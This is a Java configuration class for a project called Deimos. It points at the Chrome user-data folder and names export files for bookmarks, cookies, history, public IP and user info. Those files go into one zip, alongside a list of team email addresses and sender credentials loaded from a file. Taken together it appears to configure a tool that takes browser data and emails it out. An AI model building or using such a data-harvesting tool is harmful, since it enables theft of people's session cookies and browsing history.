package deimos.common;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;

/**
 * Contains several constants that are referenced throughout the
 * entire Deimos system to help configure it.
 * 
 * @author Siddhesh Karekar
 *
 */
public class DeimosConfig {

	public static final String DIR_OUTPUT = "output";
	public static final String DIR_CHROME_WIN = System.getenv("LOCALAPPDATA") +
			"/Google/Chrome/User Data/Default";

	/**
	 * Stores the e-mail credentials and passwords.
	 * Remember to make sure .gitignore is set accordingly!
	 */
	public static final String FILE_CREDENTIALS = "src/deimos/common/credentials.properties";

	public static final String FILE_OUTPUT_BOOKMARKS = "export-bookmarks.txt";
	public static final String FILE_OUTPUT_COOKIES = "export-cookies.txt";
	public static final String FILE_OUTPUT_HISTORY = "export-history.txt";
	public static final String FILE_OUTPUT_PUBLICIP = "export-publicIP.txt";
	public static final String FILE_OUTPUT_USERINFO = "export-userInfo.txt";
	public static final String[] FILES_OUTPUT_ALL = {

			FILE_OUTPUT_BOOKMARKS,
			FILE_OUTPUT_COOKIES,
			FILE_OUTPUT_HISTORY,
			FILE_OUTPUT_PUBLICIP,
			FILE_OUTPUT_USERINFO
	};
	public static final String FILE_OUTPUT_ALL_ZIP = "export-all.zip";

	public static final String DELIM = "|";

	public static final String EMAIL_TEAM_SIDDHESH = "siddhesh.karekar@somaiya.edu";
	public static final String EMAIL_TEAM_AMOGH = "amogh.bhabal@somaiya.edu";
	public static final String EMAIL_TEAM_BHUSHAN = "bhushan.pathak@somaiya.edu";

	public static final String[] EMAILS_TEAM = {
			EMAIL_TEAM_SIDDHESH,
			EMAIL_TEAM_AMOGH,
			EMAIL_TEAM_BHUSHAN
	};

	public static String EMAIL_SEND;
	public static String EMAIL_SEND_USERNAME;
	public static String EMAIL_SEND_PASSWORD;

	static {
		
		// Get the EMAIL_SEND attributes from credentials.properties
		Properties prop = new Properties();
		InputStream input = null;
		try {

			input = new FileInputStream(FILE_CREDENTIALS);

			// load a properties file
			prop.load(input);

			// get the property value and print it out
			EMAIL_SEND = prop.getProperty("EMAIL_SEND");
			EMAIL_SEND_USERNAME = prop.getProperty("EMAIL_SEND_USERNAME");
			EMAIL_SEND_PASSWORD = prop.getProperty("EMAIL_SEND_PASSWORD");

		}
		catch (IOException ex) {
			ex.printStackTrace();
		}
		finally {
			if (input != null) {
				try {
					input.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
	}
}
